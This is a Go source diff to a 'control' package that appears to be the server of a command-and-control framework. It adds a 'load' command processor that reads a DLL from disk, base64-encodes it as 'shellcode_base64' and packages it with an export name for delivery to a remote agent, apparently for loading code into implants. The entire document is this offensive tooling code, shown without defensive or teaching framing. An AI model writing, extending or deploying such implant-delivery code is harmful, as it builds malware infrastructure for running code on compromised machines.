@@ -1,8 +1,10 @@
 package control
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"os"
@@ -17,7 +19,9 @@ type CommandType struct {
 
 type CommandValidator func(json.RawMessage) error
 
-// Registry of valid commands with their validators and processors
+// CommandProcessor processes command-specific arguments (e.g., file loading)
+type CommandProcessor func(json.RawMessage) (json.RawMessage, error)
+
 // Registry of valid commands with their validators and processors
 var validCommands = map[string]struct {
 	Validator CommandValidator
@@ -73,6 +77,22 @@ func handleCommand(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Process arguments (e.g., load file and convert to base64)
+	processedArgs, err := cmdConfig.Processor(cmdType.Arguments)
+	if err != nil {
+		log.Printf("ERROR: Processing failed for '%s': %v", cmdType.Command, err)
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]string{
+			"status": "error",
+			"error":  fmt.Sprintf("Processing failed: %v", err),
+		})
+		return
+	}
+
+	// Update command with processed arguments
+	cmdType.Arguments = processedArgs
+	log.Printf("Processed command arguments: %s", cmdType.Command)
+
 	// Confirm on the client side command was received
 	w.WriteHeader(http.StatusOK)
 	json.NewEncoder(w).Encode("Received command")
@@ -110,4 +130,50 @@ func validateLoadCommand(rawArgs json.RawMessage) error {
 	log.Printf("Validation passed: file_path=%s, export_name=%s", args.FilePath, args.ExportName)
 
 	return nil
+}
+
+// processLoadCommand reads the DLL file and converts to base64
+func processLoadCommand(rawArgs json.RawMessage) (json.RawMessage, error) {
+	var clientArgs struct {
+		FilePath   string `json:"file_path"`
+		ExportName string `json:"export_name"`
+	}
+
+	if err := json.Unmarshal(rawArgs, &clientArgs); err != nil {
+		return nil, fmt.Errorf("unmarshaling args: %w", err)
+	}
+
+	// Read the DLL file
+	file, err := os.Open(clientArgs.FilePath)
+	if err != nil {
+		return nil, fmt.Errorf("opening file: %w", err)
+	}
+	defer file.Close()
+
+	fileBytes, err := io.ReadAll(file)
+	if err != nil {
+		return nil, fmt.Errorf("reading file: %w", err)
+	}
+
+	// Convert to base64
+	shellcodeB64 := base64.StdEncoding.EncodeToString(fileBytes)
+
+	// Create the arguments that will be sent to the agent
+	agentArgs := struct {
+		ShellcodeBase64 string `json:"shellcode_base64"`
+		ExportName      string `json:"export_name"`
+	}{
+		ShellcodeBase64: shellcodeB64,
+		ExportName:      clientArgs.ExportName,
+	}
+
+	processedJSON, err := json.Marshal(agentArgs)
+	if err != nil {
+		return nil, fmt.Errorf("marshaling processed args: %w", err)
+	}
+
+	log.Printf("Processed file: %s (%d bytes) -> base64 (%d chars)",
+		clientArgs.FilePath, len(fileBytes), len(shellcodeB64))
+
+	return processedJSON, nil
 }
